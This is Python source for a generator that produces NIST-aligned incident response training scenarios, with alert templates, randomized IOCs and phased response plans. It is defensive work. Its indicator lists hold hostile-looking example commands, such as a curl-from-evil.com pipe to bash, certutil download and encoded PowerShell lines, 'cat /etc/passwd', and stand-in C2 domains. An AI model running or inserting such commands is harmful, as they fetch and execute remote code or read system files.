"""
Incident Response generator.
Produces NIST SP 800-61 aligned incident response scenarios including
compromised servers, data breaches, phishing, insider threats, ransomware (defensive),
DDoS mitigation, credential stuffing, web shell discovery, cryptominer detection,
and supply chain incidents.
Target: 7000 entries.
"""

import random
from typing import List, Dict, Any
from ..templates import (
    CategoryGenerator, pick_complexity, pick_severity, format_entry,
    rand_ip, rand_domain, rand_port, rand_var_name, rand_func_name,
    rand_table_name, rand_path,
)
from ..knowledge_base import (
    CWE_DB, OWASP_TOP10, MITRE_ATTACK, APP_CONTEXTS, PRODUCTS,
    CLOUD_SERVICES, FRAMEWORKS, PROTOCOLS,
)


# ── Instruction pools ──────────────────────────────────────────────────────

IR_INSTRUCTIONS = [
    "As an incident responder, analyze the following security alert and develop a comprehensive incident response plan following NIST SP 800-61 guidelines.",
    "You are the lead incident handler. Evaluate the following indicators and create a structured response plan covering detection, containment, eradication, and recovery.",
    "Analyze these indicators of compromise and develop an incident response procedure. Include immediate containment actions and long-term remediation steps.",
    "Review the following security incident scenario. Provide a detailed response plan with timeline, containment strategy, and lessons learned.",
    "As a SOC analyst, triage this security alert. Determine the severity, classify the incident type, and outline the response procedure.",
    "Evaluate the following incident indicators. Develop a coordinated response plan including communication, containment, forensics, and recovery phases.",
    "You are responding to an active security incident. Analyze the evidence provided and create a step-by-step incident response playbook.",
    "Assess the following security event. Determine if it constitutes a security incident, classify its severity, and provide a response plan.",
    "As a CSIRT team lead, develop an incident response plan for the following scenario. Include stakeholder communication and regulatory considerations.",
    "Analyze these indicators of compromise and map them to MITRE ATT&CK techniques. Develop a detection and response strategy.",
    "Review this incident report and provide a post-incident analysis with root cause, timeline reconstruction, and preventive recommendations.",
    "You have been alerted to the following suspicious activity. Perform initial triage, assess the scope, and develop a containment and eradication plan.",
    "As a digital forensics analyst, examine the following evidence from a security incident. Provide analysis findings and recommend response actions.",
    "Evaluate this security incident scenario from a compliance perspective. Identify notification requirements and regulatory obligations alongside technical response.",
    "Develop an incident response playbook for the following scenario type. Include decision trees, escalation criteria, and key response actions.",
    "Analyze the following security monitoring alerts. Correlate the events, determine the attack chain, and provide a prioritized response plan.",
]

# ── Incident scenario types ───────────────────────────────────────────────

SCENARIO_TYPES = [
    "compromised_server", "data_breach", "phishing_campaign",
    "insider_threat", "ransomware", "ddos", "credential_stuffing",
    "web_shell", "cryptominer", "supply_chain",
]

# ── Alert / IOC templates for each scenario ───────────────────────────────

ALERT_TEMPLATES = {
    "compromised_server": [
        "SIEM alert: Multiple failed SSH attempts from {ext_ip} followed by successful login to {server} at {time}. Post-authentication, anomalous process execution detected: {process}. Outbound connections observed to {c2_ip}:{c2_port}.",
        "EDR alert: Suspicious process tree on {server}. Parent: {service} spawned {shell} which executed {process}. Network beacon detected every {interval} seconds to {c2_domain}. User context: {user}.",
        "IDS signature match: {signature} triggered on traffic between {server} and {ext_ip}. HTTP POST requests to {c2_domain}{path} containing base64-encoded data. Source process: {process} running as {user}.",
    ],
    "data_breach": [
        "DLP alert: Unusual data transfer of {size} from {db_server} to {ext_ip}. Query logs show bulk SELECT from {table} table by user {user} at {time}. Normal baseline for this user is under 100 records/day; today's count: {record_count}.",
        "SIEM correlation: User {user} accessed {record_count} records from {table} via {app} at {time}. Access originated from {ext_ip} (geolocation: {country}). Previous login from {normal_country}. MFA not enforced on this account.",
        "Cloud audit log: S3 bucket {bucket} access pattern anomaly. {record_count} objects downloaded to IP {ext_ip} over {duration}. IAM user {user} used access key {access_key_prefix}****. Bucket contains {data_type}.",
    ],
    "phishing_campaign": [
        "Email gateway alert: {email_count} emails received with subject '{subject}' from sender {sender}. {click_count} users clicked the link to {phish_domain}. {cred_count} users submitted credentials on the phishing page.",
        "SIEM correlation: Multiple users reported suspicious email at {time}. Sender: {sender}. Link: https://{phish_domain}{path}. SSL certificate issued by Let's Encrypt {days_ago} days ago. Domain registered {reg_days} days ago via {registrar}.",
        "Endpoint alert: User {user} on {workstation} visited {phish_domain} and downloaded {payload_name}. File hash: {file_hash}. VirusTotal: {vt_detections}/{vt_total} detections. Process {payload_name} spawned {child_process}.",
    ],
    "insider_threat": [
        "UEBA alert: User {user} ({role}) exhibited anomalous behavior. Accessed {access_count} files in {department} share outside normal working hours ({time}). USB device {usb_id} connected. {size} of data copied.",
        "DLP alert: User {user} sent {email_count} emails with attachments to personal email {personal_email} containing documents tagged as '{classification}'. Activity occurred between {start_time} and {end_time}.",
        "Privileged access alert: Admin user {user} created new service account {svc_account} with elevated permissions at {time}. No change ticket associated. Account immediately used to access {target_system} from {ext_ip}.",
    ],
    "ransomware": [
        "EDR alert: Rapid file encryption detected on {server}. Process {process} (PID: {pid}) is renaming files with .{extension} extension. {file_count} files affected in {duration}. Ransom note '{ransom_file}' dropped in affected directories.",
        "SIEM: Volume shadow copy deletion detected on {server} at {time}. vssadmin.exe executed by {user}. Followed by bcdedit.exe disabling recovery mode. SMB scanning detected from {server} to {subnet}/24.",
        "Network alert: {server} exhibiting lateral movement. SMB connections to {target_count} hosts on port 445. PsExec-like activity detected. Source process: {process} running as {user}. Encryption activity on {target_count} endpoints.",
    ],
    "ddos": [
        "WAF/CDN alert: Traffic spike to {domain} - {pps} packets/sec, {bandwidth} Gbps. Source: {source_count} unique IPs. Attack vector: {attack_type}. Backend response time increased from {normal_latency}ms to {attack_latency}ms.",
        "Network monitoring: {attack_type} attack detected against {domain}:{port}. Peak volume: {bandwidth} Gbps. Geographic distribution: {geo_distribution}. Attack signature: {signature}. Service availability: {availability}%.",
        "Load balancer alert: Connection pool exhaustion on {domain}. {connection_count} concurrent connections from {source_count} sources. Request pattern: {pattern}. Backend health checks failing for {failing_count}/{total_backends} backends.",
    ],
    "credential_stuffing": [
        "WAF alert: {attempt_count} login attempts to {domain}/login in {duration}. {unique_users} unique usernames targeted. Source: {source_count} IP addresses. Success rate: {success_rate}%. Credential pairs appear in known breach databases.",
        "SIEM correlation: Authentication anomaly on {domain}. {attempt_count} failed logins followed by {success_count} successful logins from {source_count} distributed IPs. User-Agent rotation detected: {ua_count} unique User-Agents.",
        "Fraud detection: {success_count} accounts logged in from unusual locations within {duration}. Previous login IPs do not match. {account_action_count} accounts initiated {sensitive_action} within minutes of login.",
    ],
    "web_shell": [
        "File integrity monitoring: New file {shell_path} detected on {server} at {time}. File size: {file_size} bytes. Not in deployment manifest. File contains {shell_type} functions: {functions}. Accessed {access_count} times since creation.",
        "WAF alert: Suspicious requests to {shell_path} on {server}. Requests include command parameters: {param}={cmd_sample}. Response sizes vary (indicating command output). Source IP: {ext_ip}. User-Agent: {user_agent}.",
        "IDS alert: Outbound traffic from {server} web process ({web_process}) to {c2_ip}:{c2_port}. Process tree shows {web_process} -> {shell} -> {process}. File {shell_path} created {days_ago} days ago, matches known {shell_type} web shell signature.",
    ],
    "cryptominer": [
        "EDR alert: High CPU utilization ({cpu_pct}%) on {server} sustained for {duration}. Process: {process} (PID: {pid}) connecting to mining pool {pool_domain}:{pool_port} via Stratum protocol. Running as user {user}.",
        "Network monitoring: {server} connecting to known mining pool IPs. DNS queries for {pool_domain}. Traffic pattern: persistent TCP connections on port {pool_port} with periodic data exchange matching mining protocol signatures.",
        "Container security: Pod {pod_name} in namespace {namespace} consuming {cpu_pct}% CPU. Image {image} contains binary {process} not in original image layers. Process connects to {pool_domain}:{pool_port}. Container started {days_ago} days ago.",
    ],
    "supply_chain": [
        "Dependency scanner alert: Package {package_name}@{version} in {repo} contains obfuscated post-install script. Script contacts {c2_domain} and downloads {payload_name}. Package was updated {days_ago} days ago by new maintainer {maintainer}.",
        "CI/CD alert: Build pipeline for {repo} modified at {time} by user {user}. New step added: downloads script from {c2_domain}/build.sh. Previous builds did not include this step. Artifact hash mismatch detected.",
        "SCA alert: Typosquatting package {package_name} detected in {repo} dependencies. Original package: {original_package}. Malicious version contains {payload_type} targeting {target}. {download_count} downloads before detection.",
    ],
}

# ── IOC generation helpers ────────────────────────────────────────────────

PROCESSES = [
    "/tmp/.cache/update", "C:\\Windows\\Temp\\svchost.exe", "/dev/shm/kworker",
    "python3 -c 'import socket...'", "powershell -enc BASE64ENCODED",
    "/var/tmp/systemd-private", "cmd.exe /c certutil -urlcache",
    "/usr/bin/curl http://evil.com/payload | bash", "rundll32.exe shell32.dll",
    "/opt/.hidden/minerd", "java -jar /tmp/payload.jar",
]

SHELLS = ["/bin/bash", "/bin/sh", "cmd.exe", "powershell.exe", "/bin/dash"]

SERVICES = ["apache2", "nginx", "sshd", "httpd", "tomcat", "node", "java", "dotnet", "php-fpm"]

SIGNATURES = [
    "ET TROJAN Generic Backdoor Communication", "MALWARE-CNC Win.Trojan.Beacon",
    "ET POLICY Outbound SSH Connection", "ET SCAN Potential SSH Scan",
    "INDICATOR-COMPROMISE Encoded PowerShell", "ET TROJAN Cobalt Strike Beacon",
    "MALWARE-BACKDOOR Webshell Activity", "ET POLICY Cryptocurrency Mining Pool Connection",
]

ATTACK_TYPES = [
    "SYN Flood", "UDP Amplification", "HTTP GET Flood", "Slowloris",
    "DNS Amplification", "NTP Reflection", "ICMP Flood", "HTTP POST Flood",
    "SSL/TLS Exhaustion", "Application Layer (L7)",
]

SHELL_TYPES = ["PHP", "ASP.NET", "JSP", "Python", "Perl"]

SHELL_FUNCTIONS = {
    "PHP": "eval(), system(), passthru(), shell_exec()",
    "ASP.NET": "Process.Start(), cmd.exe /c, powershell.exe",
    "JSP": "Runtime.getRuntime().exec(), ProcessBuilder",
    "Python": "os.system(), subprocess.Popen(), exec()",
    "Perl": "system(), exec(), backticks, open(PIPE)",
}

RANSOM_EXTENSIONS = ["locked", "encrypted", "crypted", "enc", "pay", "crypt", "lock"]
RANSOM_NOTES = ["README_DECRYPT.txt", "RECOVER_FILES.html", "HOW_TO_DECRYPT.txt",
                "PAYMENT_INFO.txt", "DECRYPT_INSTRUCTIONS.html"]

COUNTRIES = ["Russia", "China", "North Korea", "Iran", "Brazil", "Nigeria",
             "Romania", "Ukraine", "Vietnam", "Turkey"]
NORMAL_COUNTRIES = ["United States", "United Kingdom", "Canada", "Germany", "Australia"]

PHISH_SUBJECTS = [
    "Urgent: Your account has been compromised",
    "Action Required: Verify your identity",
    "IT Department: Password reset required",
    "Important: Invoice #{num} attached",
    "HR: Updated benefits enrollment",
    "Security Alert: Unusual login detected",
    "Shared Document: Q{q} Financial Report",
    "Package Delivery Notification",
    "Your subscription is expiring",
    "Meeting Recording: {topic}",
]

DATA_TYPES = ["customer PII", "payment card data", "health records (PHI)",
              "employee HR records", "intellectual property", "trade secrets",
              "authentication credentials", "financial reports"]

CLASSIFICATIONS = ["Confidential", "Internal Only", "Restricted",
                    "PII", "PHI", "PCI-DSS Scoped"]

MINING_POOLS = ["pool.minexmr.com", "xmr.pool.minergate.com", "monerohash.com",
                "pool.hashvault.pro", "gulf.moneroocean.stream"]

PACKAGES = ["event-stream", "ua-parser-js", "coa", "rc", "colors",
            "lodash-utils", "crossenv", "babelcli", "http-proxy-utils"]


def _fill_alert(rng, template, scenario_type):
    """Fill an alert template with randomized IOC values."""
    replacements = {
        "{ext_ip}": rand_ip(rng),
        "{server}": rng.choice(["web-prod-01", "db-prod-02", "app-server-03",
                                 "api-gateway-01", "mail-server-01", "file-server-02",
                                 "jenkins-ci-01", "k8s-worker-04"]),
        "{time}": f"{rng.randint(0,23):02d}:{rng.randint(0,59):02d} UTC",
        "{process}": rng.choice(PROCESSES),
        "{c2_ip}": rand_ip(rng),
        "{c2_port}": str(rng.choice([443, 8443, 4444, 8080, 1337, 9999, 53])),
        "{c2_domain}": f"{rng.choice(['update','cdn','api','static','sync','check'])}.{rng.choice(['evil-domain.com','malware-c2.net','bad-actor.io','suspicious.xyz'])}",
        "{service}": rng.choice(SERVICES),
        "{shell}": rng.choice(SHELLS),
        "{interval}": str(rng.choice([30, 60, 120, 300, 600])),
        "{user}": rng.choice(["www-data", "apache", "nginx", "root", "admin",
                               "svc_deploy", "jenkins", "backup_user"]),
        "{signature}": rng.choice(SIGNATURES),
        "{path}": rand_path(rng),
        "{db_server}": rng.choice(["db-prod-01", "mysql-primary", "postgres-main", "mongo-cluster-01"]),
        "{table}": rand_table_name(rng),
        "{size}": f"{rng.choice([50, 150, 500, 1200, 3500])} MB",
        "{record_count}": str(rng.choice([5000, 25000, 100000, 500000, 1500000])),
        "{country}": rng.choice(COUNTRIES),
        "{normal_country}": rng.choice(NORMAL_COUNTRIES),
        "{app}": rng.choice(APP_CONTEXTS),
        "{bucket}": f"{rng.choice(['prod','staging','backup','data'])}-{rng.choice(['assets','uploads','exports','reports'])}-{rng.randint(100,999)}",
        "{access_key_prefix}": f"AKIA{rng.choice(['I','J','K','L','M'])}{rng.choice(['A','B','C','D','E'])}",
        "{data_type}": rng.choice(DATA_TYPES),
        "{duration}": rng.choice(["15 minutes", "1 hour", "3 hours", "6 hours", "24 hours"]),
        "{email_count}": str(rng.choice([50, 200, 500, 1500, 5000])),
        "{subject}": rng.choice(PHISH_SUBJECTS).format(
            num=rng.randint(10000, 99999), q=rng.randint(1, 4), topic="Project Update"),
        "{sender}": f"{rng.choice(['support','admin','security','hr','it'])}@{rng.choice(['company-update.com','secure-login.net','account-verify.io'])}",
        "{click_count}": str(rng.choice([5, 15, 30, 75, 150])),
        "{cred_count}": str(rng.choice([2, 5, 10, 25, 50])),
        "{phish_domain}": f"{rng.choice(['secure','login','account','verify'])}-{rng.choice(['update','portal','check'])}.{rng.choice(['com','net','io'])}",
        "{days_ago}": str(rng.randint(1, 14)),
        "{reg_days}": str(rng.randint(1, 7)),
        "{registrar}": rng.choice(["Namecheap", "GoDaddy", "NameSilo", "Tucows"]),
        "{workstation}": f"WS-{rng.choice(['ENG','MKT','FIN','HR','EXEC'])}-{rng.randint(100,999)}",
        "{payload_name}": rng.choice(["update.exe", "document.pdf.exe", "invoice.js",
                                       "setup.msi", "patch.bat"]),
        "{file_hash}": f"{''.join(rng.choices('0123456789abcdef', k=64))}",
        "{vt_detections}": str(rng.randint(15, 55)),
        "{vt_total}": "72",
        "{child_process}": rng.choice(["cmd.exe", "powershell.exe", "rundll32.exe", "certutil.exe"]),
        "{role}": rng.choice(["Software Engineer", "System Administrator", "DBA",
                               "Finance Analyst", "HR Manager", "Sales Director"]),
        "{access_count}": str(rng.choice([50, 200, 500, 1500])),
        "{department}": rng.choice(["Engineering", "Finance", "HR", "Legal",
                                     "Executive", "R&D", "Sales"]),
        "{usb_id}": f"USB-{rng.randint(1000,9999)}",
        "{personal_email}": f"{rng.choice(['john','jane','user','admin'])}@{rng.choice(['gmail.com','protonmail.com','outlook.com'])}",
        "{classification}": rng.choice(CLASSIFICATIONS),
        "{start_time}": f"{rng.randint(20,23):02d}:{rng.randint(0,59):02d}",
        "{end_time}": f"{rng.randint(0,5):02d}:{rng.randint(0,59):02d}",
        "{svc_account}": f"svc_{rng.choice(['backup','deploy','monitor','sync'])}_{rng.randint(1,99)}",
        "{target_system}": rng.choice(["domain controller", "database server",
                                        "file server", "email server", "backup server"]),
        "{pid}": str(rng.randint(1000, 65535)),
        "{extension}": rng.choice(RANSOM_EXTENSIONS),
        "{file_count}": str(rng.choice([500, 2000, 10000, 50000, 200000])),
        "{ransom_file}": rng.choice(RANSOM_NOTES),
        "{subnet}": f"10.{rng.randint(0,255)}.{rng.randint(0,255)}",
        "{target_count}": str(rng.choice([5, 15, 50, 100, 250])),
        "{domain}": rand_domain(rng),
        "{port}": str(rng.choice([80, 443, 8080, 8443])),
        "{pps}": f"{rng.choice([50, 100, 500, 1000])}K",
        "{bandwidth}": str(rng.choice([1, 5, 10, 40, 100, 300])),
        "{source_count}": str(rng.choice([500, 5000, 50000, 200000])),
        "{attack_type}": rng.choice(ATTACK_TYPES),
        "{normal_latency}": str(rng.choice([15, 25, 50, 100])),
        "{attack_latency}": str(rng.choice([2000, 5000, 15000, 30000])),
        "{geo_distribution}": rng.choice(["globally distributed", "primarily Eastern Europe",
                                           "concentrated in Asia-Pacific", "US-based botnet"]),
        "{availability}": str(rng.choice([0, 15, 40, 60, 85])),
        "{connection_count}": str(rng.choice([10000, 50000, 200000, 1000000])),
        "{pattern}": rng.choice(["slowloris-style slow headers", "rapid GET /",
                                  "POST with large bodies", "randomized URI paths"]),
        "{failing_count}": str(rng.randint(2, 8)),
        "{total_backends}": str(rng.randint(3, 10)),
        "{attempt_count}": str(rng.choice([5000, 25000, 100000, 500000])),
        "{unique_users}": str(rng.choice([1000, 5000, 20000, 100000])),
        "{success_rate}": f"{rng.uniform(0.5, 5.0):.1f}",
        "{success_count}": str(rng.choice([10, 50, 200, 500])),
        "{ua_count}": str(rng.choice([5, 15, 50, 200])),
        "{account_action_count}": str(rng.choice([5, 15, 30, 75])),
        "{sensitive_action}": rng.choice(["password change", "email update",
                                           "fund transfer", "API key generation"]),
        "{shell_path}": rng.choice(["/var/www/html/.system.php", "/var/www/uploads/thumb.php",
                                     "C:\\inetpub\\wwwroot\\web.aspx", "/opt/app/static/config.jsp",
                                     "/var/www/html/wp-content/uploads/shell.php"]),
        "{file_size}": str(rng.choice([256, 1024, 4096, 8192, 15360])),
        "{shell_type}": rng.choice(SHELL_TYPES),
        "{functions}": "",  # filled below
        "{param}": rng.choice(["cmd", "exec", "c", "command", "action"]),
        "{cmd_sample}": rng.choice(["id", "whoami", "cat /etc/passwd", "net user",
                                     "ls -la", "ipconfig /all"]),
        "{user_agent}": rng.choice(["Mozilla/5.0", "Python-urllib/3.9", "curl/7.68",
                                     "Go-http-client/1.1", "Java/11.0.2"]),
        "{web_process}": rng.choice(["apache2", "nginx", "httpd", "w3wp.exe", "java"]),
        "{cpu_pct}": str(rng.choice([85, 90, 95, 98, 99, 100])),
        "{pool_domain}": rng.choice(MINING_POOLS),
        "{pool_port}": str(rng.choice([3333, 4444, 5555, 7777, 14444, 14433])),
        "{pod_name}": f"{rng.choice(['web','api','worker','batch'])}-{rng.choice('abcdef')}{rng.randint(1000,9999)}",
        "{namespace}": rng.choice(["default", "production", "staging", "kube-system"]),
        "{image}": f"registry.example.com/{rng.choice(['app','service','worker'])}:{''.join(rng.choices('0123456789abcdef', k=8))}",
        "{package_name}": rng.choice(PACKAGES),
        "{version}": f"{rng.randint(1,9)}.{rng.randint(0,20)}.{rng.randint(0,50)}",
        "{repo}": rng.choice(["frontend-app", "api-service", "data-pipeline", "auth-service"]),
        "{maintainer}": f"{''.join(rng.choices('abcdefghijklmnopqrstuvwxyz', k=8))}",
        "{original_package}": "",
        "{payload_type}": rng.choice(["reverse shell", "credential harvester",
                                       "data exfiltrator", "backdoor installer"]),
        "{target}": rng.choice(["environment variables", "SSH keys", "AWS credentials",
                                 "npm tokens", ".npmrc files"]),
        "{download_count}": str(rng.choice([100, 500, 2000, 10000])),
    }
    # Fix shell functions based on type
    st = replacements.get("{shell_type}", "PHP")
    replacements["{functions}"] = SHELL_FUNCTIONS.get(st, "eval(), system()")
    replacements["{original_package}"] = replacements["{package_name}"].replace("-", "_") if "-" in replacements["{package_name}"] else replacements["{package_name}"] + "-js"

    result = template
    for k, v in replacements.items():
        result = result.replace(k, v)
    return result, replacements


# ── MITRE ATT&CK mapping per scenario ────────────────────────────────────

SCENARIO_MITRE = {
    "compromised_server": ["T1190", "T1059", "T1078", "T1071", "T1105", "T1041"],
    "data_breach": ["T1530", "T1213", "T1005", "T1567", "T1048"],
    "phishing_campaign": ["T1566", "T1204", "T1598", "T1589", "T1539"],
    "insider_threat": ["T1005", "T1074", "T1052", "T1213", "T1119"],
    "ransomware": ["T1486", "T1490", "T1489", "T1021", "T1570"],
    "ddos": ["T1498", "T1499", "T1583"],
    "credential_stuffing": ["T1110", "T1078", "T1539", "T1552"],
    "web_shell": ["T1505", "T1059", "T1190", "T1071"],
    "cryptominer": ["T1496", "T1059", "T1053", "T1525"],
    "supply_chain": ["T1195", "T1059", "T1199", "T1588"],
}

# ── CWE mapping per scenario ─────────────────────────────────────────────

SCENARIO_CWE = {
    "compromised_server": "CWE-284",
    "data_breach": "CWE-200",
    "phishing_campaign": "CWE-287",
    "insider_threat": "CWE-284",
    "ransomware": "CWE-284",
    "ddos": "CWE-400",
    "credential_stuffing": "CWE-307",
    "web_shell": "CWE-434",
    "cryptominer": "CWE-284",
    "supply_chain": "CWE-829",
}

SCENARIO_LABELS = {
    "compromised_server": "Compromised Server",
    "data_breach": "Data Breach",
    "phishing_campaign": "Phishing Campaign",
    "insider_threat": "Insider Threat",
    "ransomware": "Ransomware Incident",
    "ddos": "DDoS Attack",
    "credential_stuffing": "Credential Stuffing",
    "web_shell": "Web Shell Discovery",
    "cryptominer": "Cryptominer Detection",
    "supply_chain": "Supply Chain Compromise",
}

# ── Response plan templates per scenario ──────────────────────────────────

def _build_response_plan(rng, scenario_type, complexity, replacements):
    """Build a structured NIST IR plan for the given scenario."""
    label = SCENARIO_LABELS[scenario_type]
    mitre_ids = SCENARIO_MITRE.get(scenario_type, [])
    mitre_detail = []
    for tid in mitre_ids[:4]:
        info = MITRE_ATTACK.get(tid, {"name": "Unknown", "tactic": "Unknown"})
        mitre_detail.append(f"- **{tid}** ({info['name']}): {info['tactic']}")

    output = f"## Incident Response Plan: {label}\n\n"
    output += f"**Incident Classification:** {label}\n"
    output += f"**Severity:** {_ir_severity(rng, scenario_type).upper()}\n"
    output += f"**NIST SP 800-61 Framework**\n\n"

    # MITRE mapping
    output += "### MITRE ATT&CK Mapping\n"
    for m in mitre_detail:
        output += f"{m}\n"
    output += "\n"

    # Phase 1: Detection & Analysis
    output += "### Phase 1: Detection & Analysis\n\n"
    output += _detection_phase(rng, scenario_type, replacements)

    # Phase 2: Containment
    output += "### Phase 2: Containment\n\n"
    output += _containment_phase(rng, scenario_type, replacements)

    # Phase 3: Eradication
    output += "### Phase 3: Eradication\n\n"
    output += _eradication_phase(rng, scenario_type, replacements)

    # Phase 4: Recovery
    output += "### Phase 4: Recovery\n\n"
    output += _recovery_phase(rng, scenario_type, replacements)

    # Phase 5: Lessons Learned
    output += "### Phase 5: Post-Incident / Lessons Learned\n\n"
    output += _lessons_learned(rng, scenario_type)

    # Advanced: Timeline and IOCs
    if complexity in ("advanced", "expert"):
        output += "### Indicators of Compromise (IOCs)\n\n"
        output += _ioc_list(rng, scenario_type, replacements)

        output += "### Recommended Timeline\n\n"
        output += _timeline(rng, scenario_type)

    return output


def _ir_severity(rng, scenario_type):
    sev_map = {
        "compromised_server": ["high", "critical"],
        "data_breach": ["high", "critical"],
        "phishing_campaign": ["medium", "high"],
        "insider_threat": ["high", "critical"],
        "ransomware": ["critical"],
        "ddos": ["medium", "high"],
        "credential_stuffing": ["medium", "high"],
        "web_shell": ["high", "critical"],
        "cryptominer": ["medium", "high"],
        "supply_chain": ["high", "critical"],
    }
    return rng.choice(sev_map.get(scenario_type, ["high"]))


def _detection_phase(rng, scenario_type, r):
    phases = {
        "compromised_server": (
            "**Initial Alert Triage:**\n"
            "1. Validate the alert is not a false positive by correlating with endpoint telemetry\n"
            "2. Confirm the suspicious process execution and network connections\n"
            "3. Check authentication logs for the compromised account\n"
            "4. Assess the scope: identify other systems the compromised host communicates with\n\n"
            "**Evidence Collection:**\n"
            "- Capture volatile memory (RAM dump) before any containment actions\n"
            "- Preserve network flow logs and PCAP data for the affected timeframe\n"
            "- Collect endpoint logs (syslog, auth.log, wtmp/btmp)\n"
            "- Screenshot running processes and network connections\n\n"
        ),
        "data_breach": (
            "**Initial Assessment:**\n"
            "1. Verify the data access anomaly against the user's normal behavior baseline\n"
            "2. Determine the type and sensitivity of data accessed\n"
            "3. Confirm whether the access was from a compromised account or legitimate user\n"
            "4. Assess data exfiltration indicators (outbound transfers, email attachments)\n\n"
            "**Evidence Collection:**\n"
            "- Preserve database query logs and audit trails\n"
            "- Capture network flow logs for data transfer analysis\n"
            "- Collect authentication logs for the affected account\n"
            "- Document the scope: tables/records accessed, timeframe, volume\n\n"
        ),
        "phishing_campaign": (
            "**Initial Triage:**\n"
            "1. Obtain and analyze the phishing email headers (SPF, DKIM, DMARC results)\n"
            "2. Analyze the phishing URL in a sandbox environment\n"
            "3. Identify all recipients and determine who clicked/submitted credentials\n"
            "4. Assess the phishing page for credential harvesting or malware delivery\n\n"
            "**Evidence Collection:**\n"
            "- Preserve email samples with full headers\n"
            "- Screenshot the phishing site before takedown\n"
            "- Collect proxy/DNS logs for users who visited the phishing domain\n"
            "- Capture endpoint telemetry for users who downloaded attachments\n\n"
        ),
        "insider_threat": (
            "**Initial Assessment:**\n"
            "1. Review the user's activity pattern against established baselines\n"
            "2. Determine if the access was authorized for the user's role\n"
            "3. Assess whether data was exfiltrated (USB, email, cloud storage)\n"
            "4. Coordinate with HR and Legal before confronting the user\n\n"
            "**Evidence Collection:**\n"
            "- Preserve DLP logs, email logs, and file access audit trails\n"
            "- Collect USB device connection logs and print job records\n"
            "- Document network traffic from the user's workstation\n"
            "- Capture browser history and cloud storage sync logs\n\n"
        ),
        "ransomware": (
            "**Immediate Assessment:**\n"
            "1. Identify the ransomware variant from the ransom note and file extension\n"
            "2. Determine the encryption scope: which systems and file shares are affected\n"
            "3. Check if lateral movement is ongoing (active SMB scanning)\n"
            "4. Verify backup integrity immediately (are backups accessible and clean?)\n\n"
            "**Evidence Collection:**\n"
            "- Preserve ransom note samples and encrypted file samples\n"
            "- Capture memory dump of affected systems before shutdown\n"
            "- Collect event logs (Windows Security, PowerShell, System)\n"
            "- Document the encryption timeline from file modification timestamps\n\n"
        ),
        "ddos": (
            "**Initial Triage:**\n"
            "1. Confirm the attack type and volume from network monitoring tools\n"
            "2. Identify the target (specific service, IP, or URL pattern)\n"
            "3. Assess current service impact and availability\n"
            "4. Determine if this is a standalone attack or diversionary tactic\n\n"
            "**Evidence Collection:**\n"
            "- Capture traffic samples (PCAP) for attack characterization\n"
            "- Preserve flow data and source IP lists\n"
            "- Document timeline of service degradation\n"
            "- Record WAF/load balancer metrics and logs\n\n"
        ),
        "credential_stuffing": (
            "**Initial Assessment:**\n"
            "1. Identify the source of credential pairs (check against known breaches)\n"
            "2. Determine the success rate and number of compromised accounts\n"
            "3. Assess what actions were taken on successfully compromised accounts\n"
            "4. Identify the attack infrastructure (IPs, User-Agents, patterns)\n\n"
            "**Evidence Collection:**\n"
            "- Preserve authentication logs with timestamps and source IPs\n"
            "- Capture WAF/proxy logs showing request patterns\n"
            "- Document successfully compromised accounts and subsequent activity\n"
            "- Collect rate-limiting and CAPTCHA engagement metrics\n\n"
        ),
        "web_shell": (
            "**Initial Analysis:**\n"
            "1. Isolate and analyze the web shell file in a sandbox\n"
            "2. Determine the entry vector (how was the shell uploaded?)\n"
            "3. Review web server access logs for commands executed through the shell\n"
            "4. Assess lateral movement from the compromised web server\n\n"
            "**Evidence Collection:**\n"
            "- Preserve the web shell file with original timestamps\n"
            "- Capture web server access and error logs\n"
            "- Collect process execution logs from the web server\n"
            "- Document network connections originating from the web server process\n\n"
        ),
        "cryptominer": (
            "**Initial Triage:**\n"
            "1. Confirm mining activity via process analysis and network connections\n"
            "2. Identify the entry vector (compromised service, container image, supply chain)\n"
            "3. Determine the scope: check other hosts for similar processes\n"
            "4. Assess whether the miner coexists with other malware\n\n"
            "**Evidence Collection:**\n"
            "- Preserve the mining binary for analysis\n"
            "- Capture process tree and network connection details\n"
            "- Collect system/container logs around the initial deployment time\n"
            "- Document mining pool configuration and wallet addresses\n\n"
        ),
        "supply_chain": (
            "**Initial Assessment:**\n"
            "1. Identify all systems/builds that consumed the compromised package\n"
            "2. Analyze the malicious code in a sandbox environment\n"
            "3. Determine what the payload targets (credentials, tokens, keys)\n"
            "4. Assess whether any data was exfiltrated before detection\n\n"
            "**Evidence Collection:**\n"
            "- Preserve the malicious package version and its contents\n"
            "- Capture CI/CD pipeline logs and build artifacts\n"
            "- Collect network logs for communication with the attacker's C2\n"
            "- Document all affected repositories and deployment environments\n\n"
        ),
    }
    return phases.get(scenario_type, "Perform standard incident detection and analysis.\n\n")


def _containment_phase(rng, scenario_type, r):
    phases = {
        "compromised_server": (
            "**Short-term Containment:**\n"
            "1. Isolate the compromised server from the network (VLAN change or firewall rules)\n"
            "2. Block the C2 IP/domain at the perimeter firewall and DNS sinkhole\n"
            "3. Disable the compromised user account\n"
            "4. Block the attacker's source IP at the edge\n\n"
            "**Long-term Containment:**\n"
            "1. Deploy additional monitoring on adjacent systems\n"
            "2. Rotate all credentials that were accessible from the compromised server\n"
            "3. Enable enhanced logging on network segments the server communicates with\n"
            "4. Consider deploying a honeytoken to detect continued attacker presence\n\n"
        ),
        "data_breach": (
            "**Immediate Containment:**\n"
            "1. Disable the affected user account and revoke all active sessions\n"
            "2. Revoke any API keys or access tokens associated with the account\n"
            "3. Block the exfiltration destination IP/domain at the firewall\n"
            "4. Restrict database access to break-glass accounts only\n\n"
            "**Scope Limitation:**\n"
            "1. Implement emergency access controls on affected data stores\n"
            "2. Enable enhanced monitoring on all data access endpoints\n"
            "3. Notify data protection officer and legal team\n"
            "4. Preserve evidence before making system changes\n\n"
        ),
        "phishing_campaign": (
            "**Immediate Actions:**\n"
            "1. Block the phishing domain at the email gateway and web proxy\n"
            "2. Quarantine all phishing emails from user mailboxes\n"
            "3. Force password reset for users who submitted credentials\n"
            "4. Revoke all active sessions for compromised accounts\n\n"
            "**Extended Containment:**\n"
            "1. Enable MFA for all affected accounts immediately\n"
            "2. Request phishing domain takedown from the hosting provider\n"
            "3. Scan endpoints of users who clicked links for malware\n"
            "4. Block all domains from the phishing infrastructure\n\n"
        ),
        "insider_threat": (
            "**Containment (coordinate with HR/Legal):**\n"
            "1. Restrict the user's access to sensitive systems without alerting\n"
            "2. Enable enhanced monitoring and logging on the user's accounts\n"
            "3. Disable USB ports on the user's workstation via GPO\n"
            "4. Implement DLP rules to block the identified exfiltration channels\n\n"
